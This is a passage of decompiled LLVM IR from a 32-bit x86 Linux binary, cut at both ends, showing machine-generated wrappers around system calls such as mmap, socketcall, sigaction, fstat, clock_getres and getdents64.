  %or.cond = or i1 %v1_80530a2, %v2_80530d0
  br i1 %or.cond, label %dec_label_pc_8053105, label %dec_label_pc_80530d4

dec_label_pc_80530d4:                             ; preds = %dec_label_pc_80530a0
  %v3_80530d4 = load i32, i32* %stack_var_-288, align 4
  %v2_80530d8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80530d4, i32* %v2_80530d8, align 4
  %v2_80530e0 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80530e5 = add i32 %arg3, 4
  %v3_80530e9 = inttoptr i32 %v1_80530e5 to i16*
  %v4_80530e9 = call i32 @function_80536ba(i16* %v3_80530e9, i32 %v2_80530e0, i32 128)
  %v2_80530f2 = add i32 %arg3, 132
  %v3_80530f2 = inttoptr i32 %v2_80530f2 to i32*
  %v2_80530ff = add i32 %arg3, 136
  %v3_80530ff = inttoptr i32 %v2_80530ff to i32*
  %v0_8053105.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053105

dec_label_pc_8053105:                             ; preds = %dec_label_pc_80530a0, %dec_label_pc_80530d4
  %v0_8053105 = phi i32 [ %v5_80530c2, %dec_label_pc_80530a0 ], [ %v0_8053105.pre, %dec_label_pc_80530d4 ]
  store i32 %v0_8053038, i32* @ebx, align 4
  store i32 %v0_8053037, i32* @esi, align 4
  ret i32 %v0_8053105

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_8053105, { 1, 0 }
  uselistorder label %dec_label_pc_80530a0, { 1, 0 }
}

define i32 @function_8053110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8053110:
  %stack_var_4 = alloca i32, align 4
  %v0_8053110 = load i32, i32* @ebx, align 4
  store i32 %v0_8053110, i32* @edx, align 4
  %v2_805311b = load i32, i32* @ecx, align 4
  %v4_805311b = load i32, i32* @esi, align 4
  %v5_805311b = load i32, i32* @edi, align 4
  %v6_805311b = load i32, i32* @ebp, align 4
  %v7_805311b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805311b, i32 %v0_8053110, i32 %v4_805311b, i32 %v5_805311b, i32 %v6_805311b)
  %v8_805311b = ptrtoint i32* %v7_805311b to i32
  store i32 %v0_8053110, i32* @ebx, align 4
  %v3_8053124 = icmp ugt i32* %v7_805311b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8053124, i32 134559701)
  ret i32 %v8_805311b

; uselistorder directives
  uselistorder i32* @ebp, { 7, 53, 24, 25, 26, 27, 28, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 22, 18, 19, 20, 21, 6, 23, 3, 45, 46, 32, 33, 34, 5, 4, 41, 42, 43, 44, 40, 29, 30, 31, 37, 36, 2, 47, 48, 35, 38, 0, 39, 1, 49, 50, 51, 52, 54 }
  uselistorder i32* @ecx, { 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 3, 4, 1, 5, 31, 30, 27, 28, 29 }
}

define i32 @function_805312b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805312b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805312b = load i32, i32* @ebx, align 4
  store i32 %v0_805312b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805313e = call i32 @int80_syscall(i32 102)
  store i32 %v1_805313e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805313e, -4095
  br i1 %tmp9, label %dec_label_pc_8053157, label %dec_label_pc_805314b

dec_label_pc_805314b:                             ; preds = %dec_label_pc_805312b
  %v1_805314b = call i32 @function_805149b(i32 %v0_805312b)
  %v0_8053150 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053150 = sub i32 0, %v0_8053150
  %v2_8053152 = inttoptr i32 %v1_805314b to i32*
  store i32 %v1_8053150, i32* %v2_8053152, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805315b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053157

dec_label_pc_8053157:                             ; preds = %dec_label_pc_805312b, %dec_label_pc_805314b
  %v2_805315b = phi i32 [ %v0_805312b, %dec_label_pc_805312b ], [ %v2_805315b.pre, %dec_label_pc_805314b ]
  %v0_8053157 = phi i32 [ %v1_805313e, %dec_label_pc_805312b ], [ -1, %dec_label_pc_805314b ]
  %v2_8053159 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053159, i32* @edx, align 4
  store i32 %v2_805315b, i32* @ebx, align 4
  ret i32 %v0_8053157

; uselistorder directives
  uselistorder i32 %v1_805313e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053157, { 1, 0 }
}

define i32 @function_805315d(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805315d:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805315e = load i32, i32* @esi, align 4
  store i32 %v0_805315e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053172 = load i32, i32* @ebx, align 4
  %v7_805317a = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805317a, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805317a, -4095
  br i1 %tmp14, label %dec_label_pc_8053192, label %dec_label_pc_8053186

dec_label_pc_8053186:                             ; preds = %dec_label_pc_805315d
  %v1_8053186 = call i32 @function_805149b(i32 %v0_8053172)
  %v0_805318b = load i32, i32* %esi.global-to-local, align 4
  %v1_805318b = sub i32 0, %v0_805318b
  %v2_805318d = inttoptr i32 %v1_8053186 to i32*
  store i32 %v1_805318b, i32* %v2_805318d, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053195.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053192

dec_label_pc_8053192:                             ; preds = %dec_label_pc_805315d, %dec_label_pc_8053186
  %v2_8053195 = phi i32 [ %v0_805315e, %dec_label_pc_805315d ], [ %v2_8053195.pre, %dec_label_pc_8053186 ]
  %v0_8053192 = phi i32 [ %v7_805317a, %dec_label_pc_805315d ], [ -1, %dec_label_pc_8053186 ]
  store i32 %v2_8053195, i32* @esi, align 4
  ret i32 %v0_8053192

; uselistorder directives
  uselistorder i32 %v7_805317a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053192, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8053198(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8053198:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_80531c0(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80531c0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80531c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80531c0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80531d3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80531d3, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_80531d3, -4095
  br i1 %tmp10, label %dec_label_pc_80531ec, label %dec_label_pc_80531e0

dec_label_pc_80531e0:                             ; preds = %dec_label_pc_80531c0
  %v1_80531e0 = call i32 @function_805149b(i32 %v0_80531c0)
  %v0_80531e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80531e5 = sub i32 0, %v0_80531e5
  %v2_80531e7 = inttoptr i32 %v1_80531e0 to i32*
  store i32 %v1_80531e5, i32* %v2_80531e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80531f0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80531ec

dec_label_pc_80531ec:                             ; preds = %dec_label_pc_80531c0, %dec_label_pc_80531e0
  %v2_80531f0 = phi i32 [ %v0_80531c0, %dec_label_pc_80531c0 ], [ %v2_80531f0.pre, %dec_label_pc_80531e0 ]
  %v0_80531ec = phi i32 [ %v4_80531d3, %dec_label_pc_80531c0 ], [ -1, %dec_label_pc_80531e0 ]
  %v2_80531ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80531ee, i32* @edx, align 4
  store i32 %v2_80531f0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80531ec

; uselistorder directives
  uselistorder i32 %v4_80531d3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80531ec, { 1, 0 }
}

define i32 @function_80531f2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80531f2:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80531f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80531f2, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8053205 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8053205, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8053205, -4095
  br i1 %tmp13, label %dec_label_pc_8053220, label %dec_label_pc_8053212

dec_label_pc_8053212:                             ; preds = %dec_label_pc_80531f2
  %v1_8053212 = call i32 @function_805149b(i32 %v0_80531f2)
  %v0_8053217 = load i32, i32* @ebx, align 4
  %v1_8053217 = sub i32 0, %v0_8053217
  %v2_8053219 = inttoptr i32 %v1_8053212 to i32*
  store i32 %v1_8053217, i32* %v2_8053219, align 4
  %v2_8053238.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053233

dec_label_pc_8053220:                             ; preds = %dec_label_pc_80531f2
  %v1_8053220 = icmp eq i32 %v4_8053205, 0
  %v1_8053222 = icmp eq i1 %v1_8053220, false
  br i1 %v1_8053222, label %dec_label_pc_8053233, label %dec_label_pc_8053224

dec_label_pc_8053224:                             ; preds = %dec_label_pc_8053220
  %v4_805322b = bitcast i32* %stack_var_-68 to i16*
  %v5_805322b = call i32 @function_805363d(i16* %v4_805322b, i32 %arg2, i32 %v4_8053205, i32 %v4_8053205)
  %v0_8053233.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053233

dec_label_pc_8053233:                             ; preds = %dec_label_pc_8053220, %dec_label_pc_8053212, %dec_label_pc_8053224
  %v2_8053238 = phi i32 [ %v0_80531f2, %dec_label_pc_8053220 ], [ %v2_8053238.pre, %dec_label_pc_8053212 ], [ %v0_80531f2, %dec_label_pc_8053224 ]
  %v0_8053233 = phi i32 [ %v4_8053205, %dec_label_pc_8053220 ], [ -1, %dec_label_pc_8053212 ], [ %v0_8053233.pre, %dec_label_pc_8053224 ]
  store i32 %v2_8053238, i32* @ebx, align 4
  ret i32 %v0_8053233

; uselistorder directives
  uselistorder i32 %v4_8053205, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053233, { 2, 0, 1 }
}

define i32 @function_805323a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805323a:
  %eax.global-to-local = alloca i32, align 4
  %v0_805323a = load i32, i32* @edi, align 4
  %v0_805323b = load i32, i32* @esi, align 4
  %v0_805323c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8053241 = load i32, i32* @edx, align 4
  %v7_805324b = inttoptr i32 %arg2 to i32*
  %v8_805324b = call i32 @function_80532a9(i32 %arg1, i32* %v7_805324b, i32 %arg3, i32 %v0_8053241, i32 %v0_805323c, i32 %v0_805323b, i32 %v0_805323a)
  store i32 %v8_805324b, i32* %eax.global-to-local, align 4
  store i32 %v8_805324b, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_805324b, 1
  br i1 %tmp24, label %dec_label_pc_80532a3, label %dec_label_pc_8053259

dec_label_pc_8053259:                             ; preds = %dec_label_pc_805323a
  %v0_8053259 = load i32, i32* @ebx, align 4
  %v2_8053259 = add i32 %v0_8053259, %v8_805324b
  store i32 %v2_8053259, i32* @edi, align 4
  %v7_805329f4 = icmp ult i32 %v0_8053259, %v2_8053259
  br i1 %v7_805329f4, label %dec_label_pc_805325e, label %dec_label_pc_80532a3

dec_label_pc_805325e:                             ; preds = %dec_label_pc_8053259, %dec_label_pc_805325e
  %v0_805325e = phi i32 [ %v2_805329d, %dec_label_pc_805325e ], [ %v0_8053259, %dec_label_pc_8053259 ]
  %v1_805325e = add i32 %v0_805325e, 8
  %v2_805325e = inttoptr i32 %v1_805325e to i32*
  %v3_805325e = load i32, i32* %v2_805325e, align 4
  store i32 %v3_805325e, i32* %eax.global-to-local, align 4
  %v2_8053261 = add i32 %v0_805325e, 4
  %v3_8053261 = inttoptr i32 %v2_8053261 to i32*
  store i32 %v3_805325e, i32* %v3_8053261, align 4
  %v0_8053264 = load i32, i32* @ebx, align 4
  %v1_8053264 = add i32 %v0_8053264, 16
  %v2_8053264 = inttoptr i32 %v1_8053264 to i32*
  %v3_8053264 = load i32, i32* %v2_8053264, align 4
  store i32 %v3_8053264, i32* %eax.global-to-local, align 4
  %v1_8053267 = trunc i32 %v3_8053264 to i16
  %v3_8053267 = add i32 %v0_8053264, 8
  %v4_8053267 = inttoptr i32 %v3_8053267 to i16*
  store i16 %v1_8053267, i16* %v4_8053267, align 2
  %v0_805326b = load i32, i32* @ebx, align 4
  %v1_805326b = add i32 %v0_805326b, 18
  %v2_805326b = inttoptr i32 %v1_805326b to i8*
  %v3_805326b = load i8, i8* %v2_805326b, align 1
  %v4_805326b = zext i8 %v3_805326b to i32
  %v5_805326b = load i32, i32* %eax.global-to-local, align 4
  %v6_805326b = and i32 %v5_805326b, -256
  %v7_805326b = or i32 %v6_805326b, %v4_805326b
  store i32 %v7_805326b, i32* %eax.global-to-local, align 4
  %v3_805326e = add i32 %v0_805326b, 10
  %v4_805326e = inttoptr i32 %v3_805326e to i8*
  store i8 %v3_805326b, i8* %v4_805326e, align 1
  %v0_8053272 = load i32, i32* @ebx, align 4
  %v1_8053272 = add i32 %v0_8053272, 8
  %v2_8053272 = inttoptr i32 %v1_8053272 to i16*
  %v3_8053272 = load i16, i16* %v2_8053272, align 2
  %v4_8053272 = zext i16 %v3_8053272 to i32
  %v1_8053276 = add nsw i32 %v4_8053272, -19
  %v1_805327a = add i32 %v0_8053272, 19
  %v1_805327e = add i32 %v0_8053272, 11
  store i32 %v1_805327e, i32* %eax.global-to-local, align 4
  %v3_8053282 = inttoptr i32 %v1_805327e to i8*
  %v4_8053282 = call i32 @function_80514c5(i8* %v3_8053282, i32 %v1_805327a, i32 %v1_8053276)
  store i32 %v4_8053282, i32* %eax.global-to-local, align 4
  %v0_805328a = load i32, i32* @ebx, align 4
  %v1_805328a = add i32 %v0_805328a, 8
  %v2_805328a = inttoptr i32 %v1_805328a to i16*
  %v3_805328a = load i16, i16* %v2_805328a, align 2
  %v4_805328a = zext i16 %v3_805328a to i32
  store i32 %v4_805328a, i32* %eax.global-to-local, align 4
  %v3_8053291 = inttoptr i32 %v0_805328a to i8*
  %v4_8053291 = call i32 @function_80514c5(i8* %v3_8053291, i32 %v0_805328a, i32 %v4_805328a)
  store i32 %v4_8053291, i32* %eax.global-to-local, align 4
  %v0_8053296 = load i32, i32* @ebx, align 4
  %v1_8053296 = add i32 %v0_8053296, 8
  %v2_8053296 = inttoptr i32 %v1_8053296 to i16*
  %v3_8053296 = load i16, i16* %v2_8053296, align 2
  %v4_8053296 = zext i16 %v3_8053296 to i32
  store i32 %v4_8053296, i32* %eax.global-to-local, align 4
  %v2_805329d = add i32 %v4_8053296, %v0_8053296
  store i32 %v2_805329d, i32* @ebx, align 4
  %v1_805329f = load i32, i32* @edi, align 4
  %v7_805329f = icmp ult i32 %v2_805329d, %v1_805329f
  br i1 %v7_805329f, label %dec_label_pc_805325e, label %dec_label_pc_805329f.dec_label_pc_80532a3.loopexit_crit_edge

dec_label_pc_805329f.dec_label_pc_80532a3.loopexit_crit_edge: ; preds = %dec_label_pc_805325e
  %v0_80532a3.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80532a3

dec_label_pc_80532a3:                             ; preds = %dec_label_pc_8053259, %dec_label_pc_805329f.dec_label_pc_80532a3.loopexit_crit_edge, %dec_label_pc_805323a
  %v0_80532a3 = phi i32 [ %v8_805324b, %dec_label_pc_805323a ], [ %v0_80532a3.pre.pre, %dec_label_pc_805329f.dec_label_pc_80532a3.loopexit_crit_edge ], [ %v8_805324b, %dec_label_pc_8053259 ]
  store i32 %v0_80532a3, i32* %eax.global-to-local, align 4
  store i32 %v0_805323b, i32* @esi, align 4
  store i32 %v0_805323a, i32* @edi, align 4
  ret i32 %v0_80532a3

; uselistorder directives
  uselistorder i32 %v0_80532a3, { 1, 0 }
  uselistorder i32 %v2_805329d, { 1, 2, 0 }
  uselistorder i32 %v0_805328a, { 1, 0, 2 }
  uselistorder i32 %v0_8053272, { 1, 0, 2 }
  uselistorder i32 %v0_805325e, { 1, 0 }
  uselistorder i32 %v0_8053259, { 0, 2, 1 }
  uselistorder i32 %v8_805324b, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 11, { 5, 3, 4, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_80532a3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805325e, { 1, 0 }
}

define i32 @function_80532a9(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_80532a9:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_80532ac = load i32, i32* @edi, align 4
  %v0_80532ae = load i32, i32* @ebx, align 4
  %v15_80532af = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_80532b8 = add i32 %arg3, 30
  %v1_80532be = and i32 %v1_80532b8, -16
  %v2_80532c1 = sub i32 %v15_80532af, %v1_80532be
  %v1_80532c3 = add i32 %v2_80532c1, 15
  %v1_80532c7 = and i32 %v1_80532c3, -16
  %v1_80532cd = inttoptr i32 %v1_80532c7 to %linux_dirent64*
  store i32 %v1_80532c7, i32* %ecx.global-to-local, align 4
  %v2_80532cf = add i32 %v2_80532c1, -4
  %v3_80532cf = inttoptr i32 %v2_80532cf to i32*
  store i32 %v0_80532ae, i32* %v3_80532cf, align 4
  %v0_80532d0 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_80532d7 = call i32 @getdents64(i32 %v0_80532d0, %linux_dirent64* %v1_80532cd, i32 %arg3)
  store i32 %v5_80532d7, i32* %eax.global-to-local, align 4
  %v0_80532d9 = load i32, i32* @esp, align 4
  %v3_80532d9 = add i32 %v0_80532d9, 4
  %tmp39 = icmp ult i32 %v5_80532d7, -4095
  br i1 %tmp39, label %dec_label_pc_80532f9, label %dec_label_pc_80532e4

dec_label_pc_80532e4:                             ; preds = %dec_label_pc_80532a9
  %v1_80532e4 = call i32 @function_805149b(i32 %v5_80532d7)
  store i32 %v1_80532e4, i32* %eax.global-to-local, align 4
  %v4_80532e9 = sub i32 0, %v5_80532d7
  %v2_80532ef = inttoptr i32 %v1_80532e4 to i32*
  store i32 %v4_80532e9, i32* %v2_80532ef, align 4
  br label %dec_label_pc_80533b5

dec_label_pc_80532f9:                             ; preds = %dec_label_pc_80532a9
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_80532c7, i32* @ebx, align 4
  %v5_80533a5 = add i32 %v5_80532d7, %v1_80532c7
  store i32 %v5_80533a5, i32* %eax.global-to-local, align 4
  %v7_80533a829 = icmp ult i32 %v1_80532c7, %v5_80533a5
  br i1 %v7_80533a829, label %dec_label_pc_8053312.lr.ph, label %dec_label_pc_80533b0

dec_label_pc_8053312.lr.ph:                       ; preds = %dec_label_pc_80532f9
  %v5_805331f = add i32 %tmp14, %arg3
  br label %dec_label_pc_8053312

dec_label_pc_8053312:                             ; preds = %dec_label_pc_8053312.lr.ph, %dec_label_pc_8053354
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_8053312.lr.ph ], [ %v3_8053357, %dec_label_pc_8053354 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_8053312.lr.ph ], [ %v3_8053354, %dec_label_pc_8053354 ]
  %v0_805336032 = phi i32 [ %v1_80532c7, %dec_label_pc_8053312.lr.ph ], [ %v2_805339d, %dec_label_pc_8053354 ]
  %v1_805336531 = phi i32 [ %tmp14, %dec_label_pc_8053312.lr.ph ], [ %v2_8053322, %dec_label_pc_8053354 ]
  %v0_805332c30 = phi i32 [ %v3_80532d9, %dec_label_pc_8053312.lr.ph ], [ %v1_805339f, %dec_label_pc_8053354 ]
  %v1_8053312 = add i32 %v0_805336032, 16
  %v2_8053312 = inttoptr i32 %v1_8053312 to i16*
  %v3_8053312 = load i16, i16* %v2_8053312, align 2
  %v4_8053312 = zext i16 %v3_8053312 to i32
  %v1_8053316 = add nuw nsw i32 %v4_8053312, 3
  %v1_805331c = and i32 %v1_8053316, 131068
  store i32 %v1_805331c, i32* %ecx.global-to-local, align 4
  store i32 %v5_805331f, i32* %eax.global-to-local, align 4
  %v2_8053322 = add i32 %v1_805331c, %v1_805336531
  %tmp40 = icmp ugt i32 %v2_8053322, %v5_805331f
  br i1 %tmp40, label %dec_label_pc_805332c, label %dec_label_pc_8053354

dec_label_pc_805332c:                             ; preds = %dec_label_pc_8053312
  %v1_805332c = add i32 %v0_805332c30, -4
  %v2_805332c = inttoptr i32 %v1_805332c to i32*
  store i32 0, i32* %v2_805332c, align 4
  %v5_805332e = add i32 %v0_805332c30, -8
  %v6_805332e = inttoptr i32 %v5_805332e to i32*
  store i32 %stack_var_-32.034, i32* %v6_805332e, align 4
  %v5_8053331 = add i32 %v0_805332c30, -12
  %v6_8053331 = inttoptr i32 %v5_8053331 to i32*
  store i32 %stack_var_-36.033, i32* %v6_8053331, align 4
  %v5_8053334 = add i32 %v0_805332c30, -16
  %v6_8053334 = inttoptr i32 %v5_8053334 to i32*
  store i32 %arg1, i32* %v6_8053334, align 4
  %v1_8053337 = call i32 @function_80534bf(i32 %v2_8053322)
  store i32 %v1_8053337, i32* %eax.global-to-local, align 4
  %v0_805333f = load i32, i32* @esi, align 4
  %v15_805333f = icmp eq i32 %v0_805333f, %tmp14
  %v1_8053342 = icmp eq i1 %v15_805333f, false
  br i1 %v1_8053342, label %dec_label_pc_80533b0, label %dec_label_pc_8053344

dec_label_pc_8053344:                             ; preds = %dec_label_pc_805332c
  %v1_8053344 = call i32 @function_805149b(i32 %v2_8053322)
  store i32 %v1_8053344, i32* %eax.global-to-local, align 4
  %v1_8053349 = inttoptr i32 %v1_8053344 to i32*
  store i32 22, i32* %v1_8053349, align 4
  br label %dec_label_pc_80533b5

dec_label_pc_8053354:                             ; preds = %dec_label_pc_8053312
  %v1_8053354 = add i32 %v0_805336032, 8
  %v2_8053354 = inttoptr i32 %v1_8053354 to i32*
  %v3_8053354 = load i32, i32* %v2_8053354, align 4
  store i32 %v3_8053354, i32* %eax.global-to-local, align 4
  %v1_8053357 = add i32 %v0_805336032, 12
  %v2_8053357 = inttoptr i32 %v1_8053357 to i32*
  %v3_8053357 = load i32, i32* %v2_8053357, align 4
  %v1_8053360 = inttoptr i32 %v0_805336032 to i32*
  %v2_8053360 = load i32, i32* %v1_8053360, align 4
  store i32 %v2_8053360, i32* %eax.global-to-local, align 4
  %v1_8053362 = add i32 %v0_805336032, 4
  %v2_8053362 = inttoptr i32 %v1_8053362 to i32*
  %v3_8053362 = load i32, i32* %v2_8053362, align 4
  %v2_8053365 = add i32 %v1_805336531, 4
  %v3_8053365 = inttoptr i32 %v2_8053365 to i32*
  store i32 %v3_8053362, i32* %v3_8053365, align 4
  %v0_8053368 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053368 = load i32, i32* @esi, align 4
  %v2_8053368 = inttoptr i32 %v1_8053368 to i32*
  store i32 %v0_8053368, i32* %v2_8053368, align 4
  %v0_805336a = load i32, i32* @ebx, align 4
  %v1_805336a = add i32 %v0_805336a, 8
  %v2_805336a = inttoptr i32 %v1_805336a to i32*
  %v3_805336a = load i32, i32* %v2_805336a, align 4
  store i32 %v3_805336a, i32* %eax.global-to-local, align 4
  %v1_805336d = add i32 %v0_805336a, 12
  %v2_805336d = inttoptr i32 %v1_805336d to i32*
  %v3_805336d = load i32, i32* %v2_805336d, align 4
  %v1_8053370 = load i32, i32* @esi, align 4
  %v2_8053370 = add i32 %v1_8053370, 12
  %v3_8053370 = inttoptr i32 %v2_8053370 to i32*
  store i32 %v3_805336d, i32* %v3_8053370, align 4
  %v0_8053373 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053373 = load i32, i32* @esi, align 4
  %v2_8053373 = add i32 %v1_8053373, 8
  %v3_8053373 = inttoptr i32 %v2_8053373 to i32*
  store i32 %v0_8053373, i32* %v3_8053373, align 4
  %v0_8053376 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053376 = trunc i32 %v0_8053376 to i16
  %v2_8053376 = load i32, i32* @esi, align 4
  %v3_8053376 = add i32 %v2_8053376, 16
  %v4_8053376 = inttoptr i32 %v3_8053376 to i16*
  store i16 %v1_8053376, i16* %v4_8053376, align 2
  %v0_805337a = load i32, i32* @ebx, align 4
  %v1_805337a = add i32 %v0_805337a, 18
  %v2_805337a = inttoptr i32 %v1_805337a to i8*
  %v3_805337a = load i8, i8* %v2_805337a, align 1
  %v4_805337a = zext i8 %v3_805337a to i32
  %v5_805337a = load i32, i32* %eax.global-to-local, align 4
  %v6_805337a = and i32 %v5_805337a, -256
  %v7_805337a = or i32 %v6_805337a, %v4_805337a
  store i32 %v7_805337a, i32* %eax.global-to-local, align 4
  %v2_805337d = load i32, i32* @esi, align 4
  %v3_805337d = add i32 %v2_805337d, 18
  %v4_805337d = inttoptr i32 %v3_805337d to i8*
  store i8 %v3_805337a, i8* %v4_805337d, align 1
  %v0_8053380 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053380 = load i32, i32* @esp, align 4
  %v2_8053380 = add i32 %v1_8053380, -4
  %v3_8053380 = inttoptr i32 %v2_8053380 to i32*
  store i32 %v0_8053380, i32* %v3_8053380, align 4
  %v0_8053381 = load i32, i32* @ebx, align 4
  %v1_8053381 = add i32 %v0_8053381, 16
  %v2_8053381 = inttoptr i32 %v1_8053381 to i16*
  %v3_8053381 = load i16, i16* %v2_8053381, align 2
  %v4_8053381 = zext i16 %v3_8053381 to i32
  %v1_8053385 = add nsw i32 %v4_8053381, -19
  %v2_8053388 = add i32 %v1_8053380, -8
  %v3_8053388 = inttoptr i32 %v2_8053388 to i32*
  store i32 %v1_8053385, i32* %v3_8053388, align 4
  %v0_8053389 = load i32, i32* @ebx, align 4
  %v1_8053389 = add i32 %v0_8053389, 19
  %v2_805338c = add i32 %v1_8053380, -12
  %v3_805338c = inttoptr i32 %v2_805338c to i32*
  store i32 %v1_8053389, i32* %v3_805338c, align 4
  %v0_805338d = load i32, i32* @esi, align 4
  %v1_805338d = add i32 %v0_805338d, 19
  store i32 %v1_805338d, i32* %eax.global-to-local, align 4
  %v2_8053390 = add i32 %v1_8053380, -16
  %v3_8053390 = inttoptr i32 %v2_8053390 to i32*
  store i32 %v1_805338d, i32* %v3_8053390, align 4
  %v3_8053391 = inttoptr i32 %v2_8053322 to i16*
  %v4_8053391 = call i32 @function_80536ba(i16* %v3_8053391, i32 %v3_8053354, i32 %v3_8053357)
  store i32 %v4_8053391, i32* %eax.global-to-local, align 4
  %v0_8053396 = load i32, i32* @ebx, align 4
  %v1_8053396 = add i32 %v0_8053396, 16
  %v2_8053396 = inttoptr i32 %v1_8053396 to i16*
  %v3_8053396 = load i16, i16* %v2_8053396, align 2
  %v4_8053396 = zext i16 %v3_8053396 to i32
  store i32 %v2_8053322, i32* @esi, align 4
  %v2_805339d = add i32 %v4_8053396, %v0_8053396
  store i32 %v2_805339d, i32* @ebx, align 4
  %v0_805339f = load i32, i32* @esp, align 4
  %v1_805339f = add i32 %v0_805339f, 16
  store i32 %v5_80533a5, i32* %eax.global-to-local, align 4
  %v7_80533a8 = icmp ult i32 %v2_805339d, %v5_80533a5
  br i1 %v7_80533a8, label %dec_label_pc_8053312, label %dec_label_pc_80533b0

dec_label_pc_80533b0:                             ; preds = %dec_label_pc_80532f9, %dec_label_pc_8053354, %dec_label_pc_805332c
  %v0_80533b0 = phi i32 [ %v0_805333f, %dec_label_pc_805332c ], [ %tmp14, %dec_label_pc_80532f9 ], [ %v2_8053322, %dec_label_pc_8053354 ]
  store i32 %v0_80533b0, i32* %eax.global-to-local, align 4
  %v5_80533b2 = sub i32 %v0_80533b0, %tmp14
  br label %dec_label_pc_80533b5

dec_label_pc_80533b5:                             ; preds = %dec_label_pc_8053344, %dec_label_pc_80532e4, %dec_label_pc_80533b0
  %storemerge = phi i32 [ %v5_80533b2, %dec_label_pc_80533b0 ], [ -1, %dec_label_pc_80532e4 ], [ -1, %dec_label_pc_8053344 ]
